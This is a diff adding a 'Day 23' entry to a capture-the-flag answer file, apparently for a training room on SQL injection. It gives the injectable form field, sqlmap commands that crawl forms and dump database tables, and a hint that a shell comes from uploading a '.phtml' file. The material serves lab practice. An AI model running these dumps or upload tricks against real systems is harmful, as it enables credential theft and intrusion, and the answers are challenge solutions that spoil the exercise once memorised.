@@ -104,6 +104,25 @@ Tool Refer : Cutter and gdb
 
 ```
 
+***Day 23***
+```
+LapAnd (SQL INJECTION)
+#1 Which field is SQL injectable? Use the input name used in the HTML Code.
+: log_email
+#2 What is Santa Claus' email address?
+:sqlmap -u {ip} --forms --crawl=2
+
+#3 What is Santa Claus' plaintext password?
+:sqlmap -u {ip} --forms --crawl=2 -D
+:sqlmap -u {ip} --forms --crawl=2 -D {DataBaseName} --tables
+:sqlmap -u {ip} --forms --crawl=2 -D {DataBaseName} -T {table_name} --dump
+
+#4 Santa has a secret! Which station is he meeting Mrs Mistletoe in?
+:waterloo
+
+#5 Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/
+:allow file extensions ".phtml"
+```
 
 
 
